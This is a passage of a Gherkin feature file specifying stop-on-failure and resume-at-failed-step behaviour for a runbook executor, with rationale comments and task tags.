  # Why: Stop-on-failure — a failing step halts the run and leaves later steps untouched
  # [ASSUMPTION: confidence=medium] A failing step stops the run and announces an escalated event; failure is one of the two escalation triggers.
  @task:TASK-RBX-004
  @edge-case
  Scenario: A failing step stops the run without running later steps
    Given a persisted runbook of three steps whose second step's handler fails
    When the executor runs the runbook
    Then the first step should be recorded as passed
    And the second step should be recorded as failed
    And the third step's handler should not run
    And the run should stop

  # Why: Stop-and-resume — re-running re-enters at the failed step and does not restart
  @task:TASK-RBX-004
  @edge-case
  Scenario: After a failure, re-running resumes at the failed step without restarting
    Given a runbook whose first step is recorded as passed and whose second step failed on a previous run
    And whose second step now has a handler that succeeds
    When the executor runs the runbook again
    Then the first step's handler should not run again
    And the run should resume at the second step
    And the second and remaining steps should run to completion

  # Why: Failure escalates rather than silently completing the runbook
